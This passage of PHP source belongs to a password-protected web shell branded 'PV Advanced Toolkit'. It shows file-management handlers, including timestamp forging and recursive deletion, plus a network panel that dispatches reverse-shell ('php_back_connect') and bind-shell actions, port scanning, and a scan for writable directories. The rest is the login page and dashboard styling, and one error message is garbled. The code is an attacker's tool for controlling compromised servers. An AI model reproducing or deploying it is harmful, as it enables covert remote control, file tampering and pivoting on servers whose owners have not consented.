                {
                    $response['message'] = '[Error] Failed to move uploaded chunk ' . $chunk_index . '.';
                }
                break;
            case 'create_new_file':
            case 'create_new_folder':
                $basePath = realpath($_POST['path']);
                $name = basename(trim($_POST['name']));
                $is_folder = $_POST['ajax_action'] === 'create_new_folder';
                if (!$basePath || !is_dir($basePath) || !is_writable($basePath))
                {
                    $response['message'] = '[Error] Base path invalid or not writable: ' . htmlspecialchars($_POST['path']);
                }
                elseif (empty($name))
                {
                    $response['message'] = '[Error] Name cannot be empty.';
                }
                elseif (strpbrk($name, "\\/?%*:|\"<>") !== false)
                {
                    $response['message'] = '[Error] Name contains invalid characters.';
                }
                elseif (file_exists($basePath . DIRECTORY_SEPARATOR . $name))
                {
                    $response['message'] = '[Error] Item already exists: ' . htmlspecialchars($name);
                }
                else
                {
                    if ($is_folder)
                    {
                        $response = @mkdir($basePath . DIRECTORY_SEPARATOR . $name, 0755) ? array(
                            'status' => 'success',
                            'message' => 'Folder created: ' . htmlspecialchars($name)
                        ) : array(
                            'message' => '[Error] Could not create folder. Check permissions.'
                        );
                    }
                    else
                    {
                        $response = @touch($basePath . DIRECTORY_SEPARATOR . $name) ? array(
                            'status' => 'success',
                            'message' => 'File created: ' . htmlspecialchars($name)
                        ) : array(
                            'message' => '[Error] Could not create file. Check permissions.'
                        );
                    }
                }
                break;
            case 'rename_item':
                if (isset($_POST['path']) && isset($_POST['new_name']))
                {
                    $oldPath = realpath($_POST['path']);
                    $newName = trim(basename($_POST['new_name']));
                    if (!$oldPath)
                    {
                        $response['message'] = '[Error] Original item not found: ' . htmlspecialchars($_POST['path']);
                    }
                    elseif (empty($newName) || strpbrk($newName, "\\/?%*:|\"<>") !== false)
                    {
                        $response['message'] = '[Error] Invalid new name provided.';
                    }
                    else
                    {
                        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $newName;
                        if (file_exists($newPath))
                        {
                            $response['message'] = '[Error] Target name already exists: ' . htmlspecialchars($newName);
                        }
                        else
                        {
                            $response = @rename($oldPath, $newPath) ? array(
                                'status' => 'success',
                                'message' => 'Item renamed to ' . htmlspecialchars($newName)
                            ) : array(
                                'message' => '[Error] Failed to rename. Check permissions.'
                            );
                        }
                    }
                }
                else
                {
                    $response['message'] = '[Error] Missing path or new name.';
                }
                break;
            case 'chmod_item':
                if (isset($_POST['path']) && isset($_POST['perms']))
                {
                    $path = realpath($_POST['path']);
                    $permsStr = $_POST['perms'];
                    if (!$path)
                    {
                        $response['message'] = '[Error] Item not found: ' . htmlspecialchars($_POST['path']);
                    }
                    elseif (!preg_match('/^[0-7]{3,4}$/', $permsStr))
                    {
                        $response['message'] = '[Error] Invalid permission format. Use octal (e.g., 0755).';
                    }
                    else
                    {
                        $permsOct = intval($permsStr, 8);
                        $response = @chmod($path, $permsOct) ? array(
                            'status' => 'success',
                            'message' => 'Permissions changed for ' . htmlspecialchars(basename($path)) . ' to ' . sprintf('%04o', $permsOct)
                        ) : array(
                            'message' => '[Error] Failed to change permissions. Check ownership/permissions.'
                        );
                    }
                }
                else
                {
                    $response['message'] = '[Error] Missing path or permissions.';
                }
                break;
            case 'touch_item':
                if (isset($_POST['path']) && isset($_POST['datetime_str']))
                {
                    $path = realpath($_POST['path']);
                    $timestamp = strtotime($_POST['datetime_str']);
                    if (!$path)
                    {
                        $response['message'] = '[Error] Item not found: ' . htmlspecialchars($_POST['path']);
                    }
                    elseif ($timestamp === false)
                    {
                        $response['message'] = '[Error] Invalid date/time format provided: ' . htmlspecialchars($_POST['datetime_str']) . '. UsecameraContinuous-MM-DD HH:MM:SS.';
                    }
                    else
                    {
                        if (@touch($path, $timestamp))
                        {
                            $response = array(
                                'status' => 'success',
                                'message' => 'Timestamp updated for ' . htmlspecialchars(basename($path)) . ' to ' . date("Y-m-d H:i:s", $timestamp)
                            );
                        }
                        else
                        {
                            $response['message'] = '[Error] Failed to update timestamp for ' . htmlspecialchars(basename($path));
                        }
                    }
                }
                else
                {
                    $response['message'] = '[Error] Missing path or date/time string for touch operation.';
                }
                break;
            case 'bulk_action':
                $operation = isset($_POST['bulk_operation']) ? $_POST['bulk_operation'] : '';
                $items_json = isset($_POST['selected_items']) ? $_POST['selected_items'] : '[]';
                $items = json_decode($items_json, true);
                if (empty($operation) || empty($items) || !is_array($items))
                {
                    $response['message'] = '[Error] Invalid bulk action request. No operation or items selected.';
                    break;
                }
                $errors = array();
                $success_count = 0;
                switch ($operation)
                {
                    case 'delete':
                        function delete_recursive($path)
                        {
                            if (!file_exists($path)) return true;
                            if (is_file($path) || is_link($path)) return @unlink($path);
                            if (!is_dir($path)) return false;
                            $dir_items = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS) , RecursiveIteratorIterator::CHILD_FIRST);
                            foreach ($dir_items as $item)
                            {
                                if ($item->isDir()) @rmdir($item->getRealPath());
                                else @unlink($item->getRealPath());
                            }
                            return @rmdir($path);
                        }
                        foreach ($items as $item_path)
                        {
                            if (delete_recursive($item_path))
                            {
                                $success_count++;
                            }
                            else
                            {
                                $errors[] = "Failed to delete " . htmlspecialchars(basename($item_path));
                            }
                        }
                        $response['message'] = "Deleted {$success_count} item(s).";
                        if (!empty($errors)) $response['message'] .= " Errors: " . implode(', ', $errors);
                        $response['status'] = empty($errors) ? 'success' : 'error';
                        break;
                    case 'copy':
                    case 'move':
                        $destination_path = isset($_POST['destination_path']) ? $_POST['destination_path'] : '';
                        if (empty($destination_path) || !is_dir($destination_path) || !is_writable($destination_path))
                        {
                            $response['message'] = '[Error] Invalid or non-writable destination directory.';
                            break;
                        }
                        function copy_recursive($source, $dest)
                        {
                            if (is_dir($source))
                            {
                                if (!is_dir($dest)) @mkdir($dest, 0755, true);
                                $dir_items = new DirectoryIterator($source);
                                foreach ($dir_items as $item)
                                {
                                    if ($item->isDot()) continue;
                                    if (!copy_recursive($item->getPathname() , $dest . DIRECTORY_SEPARATOR . $item->getFilename()))
                                    {
                                        return false;
                                    }
                                }
                                return true;
                            }
                            elseif (is_file($source))
                            {
                                return @copy($source, $dest);
                            }
                            return false;
                        }
                        foreach ($items as $item_path)
                        {
                            $dest_item_path = $destination_path . DIRECTORY_SEPARATOR . basename($item_path);
                            $op_success = false;
                            if ($operation === 'move')
                            {
                                $op_success = @rename($item_path, $dest_item_path);
                            }
                            else
                            {
                                $op_success = copy_recursive($item_path, $dest_item_path);
                            }
                            if ($op_success)
                            {
                                $success_count++;
                            }
                            else
                            {
                                $errors[] = "Failed to " . $operation . " " . htmlspecialchars(basename($item_path));
                            }
                        }
                        $action_past_tense = ($operation === 'move') ? 'Moved' : 'Copied';
                        $response['message'] = "{$action_past_tense} {$success_count} item(s) to " . htmlspecialchars($destination_path) . ".";
                        if (!empty($errors)) $response['message'] .= " Errors: " . implode(', ', $errors);
                        $response['status'] = empty($errors) ? 'success' : 'error';
                        break;
                    case 'zip':
                    case 'tar.gz':
                    case 'tar.bz2':
                        $archive_filename = isset($_POST['archive_filename']) ? $_POST['archive_filename'] : '';
                        if (empty($archive_filename))
                        {
                            $response['message'] = '[Error] Archive filename cannot be empty.';
                            break;
                        }
                        $archive_path = $current_ajax_cwd . DIRECTORY_SEPARATOR . $archive_filename;
                        if (file_exists($archive_path))
                        {
                            $response['message'] = '[Error] Archive file already exists: ' . htmlspecialchars($archive_filename);
                            break;
                        }
                        try
                        {
                            if ($operation === 'zip')
                            {
                                if (!class_exists('ZipArchive')) throw new Exception("ZipArchive class not available.");
                                $zip = new ZipArchive();
                                if ($zip->open($archive_path, ZipArchive::CREATE) !== true) throw new Exception("Cannot create ZIP archive.");
                                function add_to_zip($path, &$zip, $base_path)
                                {
                                    $local_path = str_replace($base_path . DIRECTORY_SEPARATOR, '', $path);
                                    if (is_dir($path))
                                    {
                                        $zip->addEmptyDir($local_path);
                                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS) , RecursiveIteratorIterator::SELF_FIRST);
                                        foreach ($files as $file)
                                        {
                                            $file_path = $file->getRealPath();
                                            $local_file_path = str_replace($base_path . DIRECTORY_SEPARATOR, '', $file_path);
                                            if ($file->isDir())
                                            {
                                                $zip->addEmptyDir($local_file_path);
                                            }
                                            else if ($file->isFile())
                                            {
                                                $zip->addFile($file_path, $local_file_path);
                                            }
                                        }
                                    }
                                    else if (is_file($path))
                                    {
                                        $zip->addFile($path, basename($path));
                                    }
                                }
                                foreach ($items as $item_path)
                                {
                                    add_to_zip($item_path, $zip, dirname($item_path));
                                }
                                $zip->close();
                            }
                            else
                            {
                                if (!class_exists('PharData')) throw new Exception("PharData class not available.");
                                $tar_filename = ($operation === 'tar.gz') ? str_replace('.tar.gz', '.tar', $archive_filename) : str_replace('.tar.bz2', '.tar', $archive_filename);
                                $tar_path = $current_ajax_cwd . DIRECTORY_SEPARATOR . $tar_filename;
                                $phar = new PharData($tar_path);
                                function add_to_tar($path, &$phar, $base_path)
                                {
                                    if (is_dir($path))
                                    {
                                        $phar->buildFromDirectory($path);
                                    }
                                    else if (is_file($path))
                                    {
                                        $phar->addFile($path, basename($path));
                                    }
                                }
                                foreach ($items as $item_path)
                                {
                                    add_to_tar($item_path, $phar, dirname($item_path));
                                }
                                if ($operation === 'tar.gz')
                                {
                                    $phar->compress(Phar::GZ);
                                }
                                else
                                {
                                    $phar->compress(Phar::BZ2);
                                }
                                @unlink($tar_path);
                            }
                            $response['status'] = 'success';
                            $response['message'] = "Successfully created archive: " . htmlspecialchars($archive_filename);
                        }
                        catch(Exception $e)
                        {
                            $response['message'] = '[Error] ' . $e->getMessage();
                            if (file_exists($archive_path)) @unlink($archive_path);
                        }
                        break;
                    }
                    break;
                case 'network_tool':
                    $sub_action = isset($_POST['sub_action']) ? $_POST['sub_action'] : 'none';
                    $output = '[Error] Invalid network action or parameters.';
                    $host_param_host = isset($_POST['host']) ? $_POST['host'] : (isset($_POST['ip']) ? $_POST['ip'] : '');
                    $host_param = trim($host_param_host);
                    $port_param_raw_port = isset($_POST['port']) ? $_POST['port'] : (isset($_POST['backport']) ? $_POST['backport'] : (isset($_POST['scan_ports']) ? $_POST['scan_ports'] : ''));
                    $port_param_raw = trim($port_param_raw_port);
                    $pass_param_bind = isset($_POST['pass']) ? $_POST['pass'] : (isset($_POST['bind_pass']) ? $_POST['bind_pass'] : '');
                    $pass_param = $pass_param_bind;
                    $port_param = 0;
                    if (is_numeric($port_param_raw) && strpos($port_param_raw, ',') === false && strpos($port_param_raw, '-') === false)
                    {
                        $port_val = intval($port_param_raw);
                        if ($port_val > 0 && $port_val < 65536)
                        {
                            $port_param = $port_val;
                        }
                    }
                    switch ($sub_action)
                    {
                        case 'ping':
                            if (!empty($host_param))
                            {
                                $output = do_ping($host_param);
                            }
                            else
                            {
                                $output = "[Error] No host provided for ping.";
                            }
                        break;
                        case 'dns':
                            if (!empty($host_param))
                            {
                                $output = do_dns_lookup($host_param);
                            }
                            else
                            {
                                $output = "[Error] No host provided for DNS lookup.";
                            }
                        break;
                        case 'port_scan':
                            if (!empty($host_param) && !empty($port_param_raw))
                            {
                                $output = do_port_scan($host_param, $port_param_raw);
                            }
                            else
                            {
                                $output = "[Error] Host and Port(s) are required for Port Scan.";
                            }
                        break;
                        case 'php_back_connect':
                            if (!empty($host_param) && $port_param > 0)
                            {
                                $output = network_start_back_connect($host_param, $port_param);
                            }
                            else
                            {
                                $output = "[Error] Non-empty Target IP/Host (" . htmlspecialchars($host_param) . ") and valid Port (1-65535) required. Port provided: " . htmlspecialchars($port_param_raw);
                            }
                        break;
                        case 'php_bind':
                            if ($port_param > 0 && !empty($pass_param))
                            {
                                $output = network_start_port_bind($port_param, $pass_param);
                            }
                            else
                            {
                                $output = "[Error] Valid Port (1-65535) and non-empty password required. Port: " . htmlspecialchars($port_param_raw);
                            }
                        break;
                        default:
                            $output = "[Error] Unknown network sub_action: " . htmlspecialchars($sub_action);
                        break;
                    }
                    $response = array(
                        'status' => 'success',
                        'output' => $output
                    );
                    break;
                case 'jumping_scan':
                    $scan_results = scanJumpingDirectories();
                    $response = array(
                        'status' => 'success',
                        'output' => $scan_results
                    );
                    break;
                case 'uncompress_file':
                    $final_source = '';
                    $original_filename = '';
                    $temp_source_to_delete = null;
                    $upload_error_code = isset($_FILES['compressed_file']) ? $_FILES['compressed_file']['error'] : UPLOAD_ERR_NO_FILE;
                    $response = array(
                        'status' => 'error',
                        'message' => 'Please either upload a file or specify a valid local file path.'
                    );
                    $local_file_path_trimmed = isset($_POST['local_file']) ? trim($_POST['local_file']) : '';
                    if (!empty($local_file_path_trimmed))
                    {
                        $source_file_path = $local_file_path_trimmed;
                        $real_user_path = realpath($source_file_path);
                        if ($real_user_path === false)
                        {
                            $response['message'] = "File path does not exist: '" . htmlspecialchars($source_file_path) . "'";
                        }
                        elseif (!is_readable($real_user_path))
                        {
                            $response['message'] = "File '" . htmlspecialchars($source_file_path) . "' is not readable.";
                        }
                        else
                        {
                            $final_source = $real_user_path;
                            $original_filename = basename($final_source);
                        }
                    }
                    elseif ($upload_error_code === UPLOAD_ERR_OK)
                    {
                        $original_filename = $_FILES['compressed_file']['name'];
                        $uploaded_tmp_path = $_FILES['compressed_file']['tmp_name'];
                        $ext = strtolower(pathinfo($original_filename, PATHINFO_EXTENSION));
                        $secondary_ext = strtolower(pathinfo(pathinfo($original_filename, PATHINFO_FILENAME) , PATHINFO_EXTENSION));
                        if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN' && ((in_array($ext, array(
                            'gz',
                            'bz2'
                        )) && $secondary_ext === 'tar') || $ext === 'tar'))
                        {
                            $new_temp_path = rtrim(sys_get_temp_dir() , DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . uniqid('phar-temp_') . '_' . basename($original_filename);
                            if (move_uploaded_file($uploaded_tmp_path, $new_temp_path))
                            {
                                $final_source = $new_temp_path;
                                $temp_source_to_delete = $new_temp_path;
                            }
                            else
                            {
                                $response['message'] = 'Could not move uploaded file to a temporary location for processing.';
                                $final_source = '';
                            }
                        }
                        else
                        {
                            $final_source = $uploaded_tmp_path;
                        }
                    }
                    elseif ($upload_error_code !== UPLOAD_ERR_NO_FILE)
                    {
                        $upload_errors = array(
                            UPLOAD_ERR_INI_SIZE => 'The uploaded file exceeds the upload_max_filesize directive in php.ini.',
                            UPLOAD_ERR_FORM_SIZE => 'The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.',
                            UPLOAD_ERR_PARTIAL => 'The uploaded file was only partially uploaded.',
                            UPLOAD_ERR_NO_TMP_DIR => 'Missing a temporary folder.',
                            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk.',
                            UPLOAD_ERR_EXTENSION => 'A PHP extension stopped the file upload.',
                        );
                        $response['message'] = isset($upload_errors[$upload_error_code]) ? $upload_errors[$upload_error_code] : 'Unknown upload error. Code: ' . $upload_error_code;
                    }
                    if ($final_source && $original_filename)
                    {
                        $destination = isset($_POST['destination']) && !empty($_POST['destination']) ? rtrim($_POST['destination'], '/\\') : '.';
                        $response = uncompress_archive($final_source, $destination, $original_filename);
                        if ($temp_source_to_delete && is_file($temp_source_to_delete))
                        {
                            @unlink($temp_source_to_delete);
                        }
                    }
                    break;
                default:
                    $response['message'] = 'Unknown AJAX action: ' . htmlspecialchars($_POST['ajax_action']);
                    break;
                }
                if (isset($response['cwd']) && is_dir($response['cwd']))
                {
                    $_SESSION['terminal_cwd'] = $response['cwd'];
                }
                elseif (!isset($response['cwd']) && isset($_SESSION['terminal_cwd']))
                {
                    $response['cwd'] = $_SESSION['terminal_cwd'];
                }
                echo safe_json_encode($response);
                exit;
            }
            if (!$authenticated):
?>
<!DOCTYPE html><html><head><title>Login</title><link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzBmZiIgZD0iTTEyIDJDNi40NzcgMiAyIDYuNDc3IDIgMTJzNC40NzcgMTAgMTAgMTAgMTAtNC40NzcgMTAtMTBTMTcuNTIzIDIgMTIgMnptMCAxOGMtNC40MTEgMC04LTMuNTg5LTgtOHMzLjU4OS04IDgtOCA4IDMuNTg5IDggOC0zLjU4OSA4LTggOHpNODUuNSAxMC41Yy44MjggMCAxLjUuNjcyIDEuNSAxLjVzLS42NzIgMS41LTEuNSAxLjVNNyAxMi44MjggNyAxMnMuNjcyLTEuNSAxLjUtMS41em03IDBjLjgyOCAwIDEuNS42NzIgMS41IDEuNXMwLS42NzIgMS41LTEuNSAxLjVTMTQgMTIuODI4IDE0IDEyczAuNjcyLTEuNSAxLjUtMS41em0tMy41IDRjLTIuMzMxIDAtNC4zMS0xLjQ2NS01LjExNi0zLjVoMTAuMjMyQzE2LjMxIDE2LjAzNSAxNC4zMzEgMTcuNSAxMiAxNy41eiIvPjwvc3ZnPg=="><link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"><style>body{background:#111;font-family:'Orbitron',sans-serif;color:#0ff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}.login-box{background:#000;padding:30px;border:1px solid #0ff;box-shadow:0 0 20px #0ff;text-align:center;border-radius:10px;}.password-wrapper{position:relative;display:inline-block;margin:10px 0;}.password-wrapper input{background:#222;border:1px solid #0ff;color:#0ff;padding:10px;width:250px;border-radius:5px;font-family:'Orbitron',sans-serif;padding-right:40px;}.password-wrapper i{position:absolute;top:50%;right:15px;transform:translateY(-50%);cursor:pointer;color:#0aa;}.btn{background:#0ff;color:#000;font-weight:bold;cursor:pointer;padding:10px 20px;border:none;border-radius:5px;transition:all 0.3s ease;}.btn:hover{background:#0aa;box-shadow:0 0 15px #0aa;}.error{color:red;margin-top:10px;}</style></head><body><div class="login-box"><h2>🔐 Access Panel</h2><form method="post"><div class="password-wrapper"><input type="password" name="password" id="login-pass-input" placeholder="Password" required><i class="fas fa-eye" id="toggle-password-vis"></i></div><br><input type="submit" class="btn" value="Authenticate"><?php if (!empty($error)): ?><div class="error"><?=htmlspecialchars($error) ?></div><?php
                endif; ?></form></div><script>const togglePassword=document.getElementById('toggle-password-vis');const passwordInput=document.getElementById('login-pass-input');togglePassword.addEventListener('click',function(e){const type=passwordInput.getAttribute('type')==='password'?'text':'password';passwordInput.setAttribute('type',type);this.classList.toggle('fa-eye-slash');});</script></body></html>
<?php
                exit;
            endif;
?>
<!DOCTYPE html>
<html>
<head>
<title>Advanced Toolkit v1.8.1</title>
<link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI+PHBhdGggZmlsbD0iIzBmZiIgZD0iTTEyIDJDNi40NzcgMiAyIDYuNDc3IDIgMTJzNC40NzcgMTAgMTAgMTAgMTAtNC40NzcgMTAtMTBTMTcuNTIzIDIgMTIgMnptMCAxOGMtNC40MTEgMC04LTMuNTg5LTgtOHMzLjU4OS04IDgtOCA4IDMuNTg5IDggOC0zLjU4OSA4LTggOHpNODUuNSAxMC41Yy44MjggMCAxLjUuNjcyIDEuNSAxLjVzLS42NzIgMS41LTEuNSAxLjVNNyAxMi44MjggNyAxMnMuNjcyLTEuNSAxLjUtMS41em03IDBjLjgyOCAwIDEuNS42NzIgMS41IDEuNXMwLS42NzIgMS41LTEuNSAxLjVTMTQgMTIuODI4IDE0IDEyczAuNjcyLTEuNSAxLjUtMS41em0tMy41IDRjLTIuMzMxIDAtNC4zMS0xLjQ2NS01LjExNi0zLjVoMTAuMjMyQzE2LjMxIDE2LjAzNSAxNC4zMzEgMTcuNSAxMiAxNy41eiIvPjwvc3ZnPg==">
<link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
body{background:#1a1a1a;font-family:'Orbitron',sans-serif;color:#0ff;margin:0;padding:0;font-size:14px;}
.container{max-width:1200px;margin:20px auto;background:#111;border:1px solid #0ff;box-shadow:0 0 25px #0ff;border-radius:10px;padding:15px;position:relative;}
header{display:flex;justify-content:space-between;align-items:center;padding-bottom:10px;border-bottom:1px solid #055;margin-bottom:15px;}
header h1{color:#0ff;margin:0;font-size:1.8em;text-shadow:0 0 10px #0ff;}
.logout-form button{background:#ff4444;color:#000;border:none;padding:8px 15px;cursor:pointer;border-radius:5px;font-family:'Orbitron',sans-serif;font-weight:bold;}
.tabs{display:flex;margin-bottom:15px;border-bottom:1px solid #077;flex-wrap:wrap;}
.tab-link{padding:10px 15px;cursor:pointer;border:1px solid transparent;border-bottom:none;margin-right:5px;background:#222;color:#0aa;border-radius:5px 5px 0 0;margin-bottom:-1px;}
.tab-link:hover,.tab-link.active{background:#000;color:#0ff;border-color:#077;border-bottom-color:#000;}
.tab-link.active{position:relative;top:1px;z-index:1;}
.tab-content{display:none;padding:15px;border:1px solid #077;border-top:none;background:#000;border-radius:0 0 5px 5px;min-height:400px;overflow:auto;}
.tab-content.active{display:block;}
#terminal-output{background:#000;color:#0f0;padding:10px;height:400px;overflow-y:scroll;border:1px solid #055;margin-bottom:10px;white-space:pre-wrap;font-family:'Consolas','Monaco',monospace;font-size:0.9em;border-radius:5px;}
#terminal-output .prompt,#terminal-output .prompt-container{color:#0ff;}
#terminal-output .input-command{color:#7ef;}
#terminal-output .error{color:#f00;}
#terminal-output .info{color:#0cc;}
#terminal-output .html-error-container iframe{width:100%;height:350px;border:1px dashed #f00;background:#fff;}
#command-input-wrapper{display:flex;gap:5px;}
#command-input{flex-grow:1;background:#111;border:1px solid #0ff;color:#0ff;padding:10px;font-family:'Consolas','Monaco',monospace;border-radius:5px;}
#file-manager-path-container{margin-bottom:10px;}
#drive-list{margin-bottom:10px;display:flex;flex-wrap:wrap;gap:10px;}
#file-manager-path{display:flex;align-items:center;flex-wrap:wrap;background:#000;padding:8px;border-radius:4px;border:1px solid #055;min-height:20px;}
#file-manager-path a{color:#0ff;text-decoration:none;padding:0 2px;}
#file-manager-path a:hover{text-decoration:underline;color:#0aa;}
#file-manager-path span.separator{color:#077;}
.inputzbut{background:#0ff;border:none;color:#000;font-weight:bold;padding:10px 15px;cursor:pointer;border-radius:4px;transition:all 0.3s ease;font-family:'Orbitron',sans-serif;}
.inputzbut:hover{background:#0aa;box-shadow:0 0 10px #0aa;}
.inputzbut:disabled{background:#555;cursor:not-allowed;}
.file-table{width:100%;border-collapse:collapse;margin-top:10px;table-layout:auto;}
.file-table th,.file-table td{border:1px solid #055;padding:8px;text-align:left;font-size:0.9em;word-break:break-all;vertical-align:middle;}
.file-table th{background:#033;color:#0ff;}
.file-table tr:nth-child(even){background:#010101;}
.file-table tbody tr:hover{background-color:#025 !important;}
.file-table .col-actions-th{width:40px;text-align:center;}
.file-table .col-actions-td{text-align:center;}
.file-table th:nth-child(3),.file-table td:nth-child(3){text-align:center;padding-left:4px;padding-right:4px;}
.file-table th:nth-child(4),.file-table td:nth-child(4){white-space:nowrap;padding-right:4px;}
.file-table th:nth-child(5),.file-table td:nth-child(5){text-align:center;white-space:nowrap;padding-left:4px;padding-right:4px;}
.file-table th:nth-child(6),.file-table td:nth-child(6){text-align:center;padding-left:4px;padding-right:4px;}
.file-table th:nth-child(7),.file-table td:nth-child(7){white-space:nowrap;padding-right:4px;}
.file-table th:nth-child(8),.file-table td:nth-child(8){text-align:center;white-space:nowrap;padding-left:4px;padding-right:4px;}
.file-table td a{color:#0ff;text-decoration:none;}
.file-table td a:hover{text-decoration:underline;color:#0aa;}
.file-table .action-btn{background-color:transparent;color:#0ff;border:none;padding:3px 4px;margin:0 2px;cursor:pointer;border-radius:3px;font-size:1.1em;text-decoration:none;display:inline-block;vertical-align:middle;}
.file-table .action-btn:hover{color:#0aa;}
.file-table td i.fa-solid,.file-table td i.fa-brands{margin-right:8px;width:20px;text-align:center;}
.info-table{width:100%;border-collapse:collapse;}
.info-table td{padding:8px;border:1px solid #055;vertical-align:top;word-break:break-all;}
.info-table td:first-child{font-weight:bold;color:#0cc;width:30%;background:#010101;}
.info-table td strong{font-weight:bold;color:#0ee;}
.info-table td span{color:lime;}
.info-table td span[style*="color:red"]{color:red !important;}
.info-table td span[style*="color:orange"]{color:orange !important;}
.info-table pre,#about-content pre{background-color:#000;color:#0f0;padding:10px;border:1px solid #033;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;max-height:300px;font-size:0.9em;border-radius:3px;}
#about-content h2,#about-content h3{color:#0ff;border-bottom:1px solid #055;padding-bottom:5px;margin-top:15px;}
#about-content ul{list-style-type:none;padding-left:0;}
#about-content ul li{background:#010101;margin-bottom:8px;padding:10px;border-left:3px solid #0ff;border-radius:3px;}
#about-content ul li strong{color:#0cc;}
#about-content p{line-height:1.6;}
.network-forms table,.network-forms fieldset{width:48%;float:left;margin:0 1%;box-sizing:border-box;min-width:300px;border:1px solid #0ff;padding:15px;background:#000;box-shadow:0 0 10px #0ff;border-radius:8px;margin-bottom:15px;}
.network-forms legend{color:#0ff;font-weight:bold;padding:0 5px;}
.network-forms h3{color:#0ff;border-bottom:1px solid #055;padding-bottom:5px;margin-top:0;margin-bottom:10px;}
.network-forms th{color:#0ff;padding-bottom:10px;font-size:1.2em;text-align:center;}
.network-forms td{padding:5px 10px;}
.inputz{background:#222;border:1px solid #0ff;color:#0ff;padding:8px;width:200px;border-radius:4px;font-family:'Orbitron',sans-serif;}
#network-results-area{clear:both;background:#000;color:#0f0;padding:15px;min-height:150px;max-height:300px;overflow-y:scroll;border:1px solid #055;margin-top:20px;white-space:pre-wrap;font-family:'Consolas','Monaco',monospace;font-size:0.9em;border-radius:5px;}
#network-results-area:empty::before{content:"Network tool results will appear here...";color:#555;}
#network-results-area span{color:lime;}
#network-results-area span[style*="color:red"]{color:red !important;}
.net-warning{color:#ff0;font-size:0.8em;margin-top:5px;display:block;text-align:center;}
#phpinfo-iframe{width:100%;height:600px;border:1px solid #055;border-radius:3px;}
.hidden{display:none !important;}
.button-bar{margin-top:10px;margin-bottom:10px;display:flex;flex-wrap:wrap;gap:10px;align-items:center;}
#upload-status{margin-left:0;color:#0cc;}
#file-view-modal,#upload-modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);z-index:1000;display:flex;align-items:center;justify-content:center;opacity:0;visibility:hidden;transition:opacity 0.3s ease,visibility 0.3s ease;}
#file-view-modal.visible,#upload-modal.visible{opacity:1;visibility:visible;}
#file-view-modal > div,#upload-modal > div{background:#111;padding:20px;border:2px solid #0ff;border-radius:10px;width:80%;max-width:900px;box-shadow:0 0 30px #0ff;transform:scale(0.9);transition:transform 0.3s ease;}
#file-view-modal.visible > div,#upload-modal.visible > div{transform:scale(1);}
#file-modal-title,#upload-modal-title{margin-top:0;color:#0ff;}
#file-content-area{width:calc(100% - 12px);height:50vh;background:#000;color:#0f0;border:1px solid #055;font-family:'Consolas','Monaco',monospace;padding:5px;font-size:0.9em;border-radius:3px;resize:vertical;}
#file-view-modal .button-bar button,#upload-modal .button-bar button{font-family:'Orbitron',sans-serif;}
.modal-message{padding:10px;margin-bottom:15px;border-radius:5px;text-align:center;font-weight:bold;}
.modal-message.success{background-color:#050;color:#0f0;border:1px solid #0a0;}
.modal-message.error{background-color:#500;color:#f00;border:1px solid #a00;}
select.inputz{width:auto;min-width:218px;}
#upload-progress-container{width:100%;max-height:400px;overflow-y:auto;padding-right:10px;}
.upload-progress-item{margin-bottom:15px;}
.upload-progress-item .filename{word-break:break-all;font-size:0.9em;margin-bottom:5px;}
.upload-progress-item .upload-progress-bar-bg{background-color:#222;border:1px solid #0ff;border-radius:5px;padding:2px;}
.upload-progress-item .upload-progress-bar{background-color:#0ff;height:15px;border-radius:3px;width:0%;transition:width 0.2s ease-out;}
.upload-progress-info{font-size:0.8em;margin-top:3px;display:flex;justify-content:space-between;}
.upload-progress-info .status{color:#0cc;}
#jumping-results{background:#000;color:#fff;padding:15px;min-height:200px;max-height:350px;overflow-y:scroll;border:1px solid #055;margin-top:20px;white-space:pre-wrap;font-family:'Consolas','Monaco',monospace;font-size:0.9em;border-radius:5px;}
#jumping-results:empty::before{content:"Scan results will appear here...";color:#555;}
.jumping-writable{color:#00ff00;}
.jumping-readable{color:#ffffff;}
.jumping-error{color:#ff4444;}
.uncompressor-sub-tabs{display:flex;gap:10px;margin-bottom:15px;}
.uncompressor-sub-tab{padding:8px 12px;cursor:pointer;border:1px solid #077;background:#222;color:#0aa;border-radius:5px;}
.uncompressor-sub-tab:hover,.uncompressor-sub-tab.active{background:#000;color:#0ff;border-color:#0ff;}
.uncompressor-sub-content{display:none;}
.uncompressor-sub-content.active{display:block;}
#uncompressor-results{background:#000;color:#fff;padding:15px;min-height:100px;max-height:300px;overflow-y:scroll;border:1px solid #055;margin-top:20px;white-space:pre-wrap;font-family:'Consolas','Monaco',monospace;font-size:0.9em;border-radius:5px;}
#uncompressor-results:empty::before{content:"Extraction results will appear here...";color:#555;}
#uncompressor-form .input-group{margin-bottom:15px;}
#uncompressor-form label{display:block;margin-bottom:5px;color:#0cc;}
#uncompressor-form .inputz{width:100%;box-sizing:border-box;}
#uncompressor-form small{font-size:0.8em;color:#888;display:block;margin-top:5px;}
#bulk-actions-container{display:flex;gap:10px;align-items:center;margin-left:20px;}
#bulk-action-inputs{display:flex;gap:5px;}
</style>
</head>
<body>
<div class="container">
<header>
<h1>💀 PV Advanced Toolkit v1.8.1</h1>
<form method="post" class="logout-form">
